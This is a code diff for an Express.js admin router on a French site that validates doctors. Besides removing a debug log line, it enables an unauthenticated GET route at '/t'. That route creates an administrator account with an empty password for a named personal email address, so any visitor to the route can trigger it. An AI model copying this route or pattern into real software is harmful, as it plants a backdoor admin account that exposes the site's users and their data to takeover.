@@ -68,7 +68,6 @@ router.get('/validation/medecin/:id', async (req, res) => {
     if (!req.params.id) return
     const doctor = await DoctorServices.getDoctorById(req.params.id)
     if (!doctor) return
-    console.log(doctor.toObject())
     res.render('Admin/pro_form', {
         pro: doctor.toObject(), 
         proType : 'Médecin', 
@@ -185,11 +184,11 @@ router.get('/accepter/medecin/:id', async (req, res) => {
 
 
 
-// router.post('/t', async (req, res) => {
-//     const password = ""
-//     const hashPassword = await bcrypt.hash(password, 10)
-//     AdminServices.addAdmin("nat.manar@gmail.com", hashPassword)
-// })
+router.get('/t', async (req, res) => {
+    const password = ""
+    const hashPassword = await bcrypt.hash(password, 10)
+    AdminServices.addAdmin("nat.manar@gmail.com", hashPassword)
+})
 
 
 module.exports = router
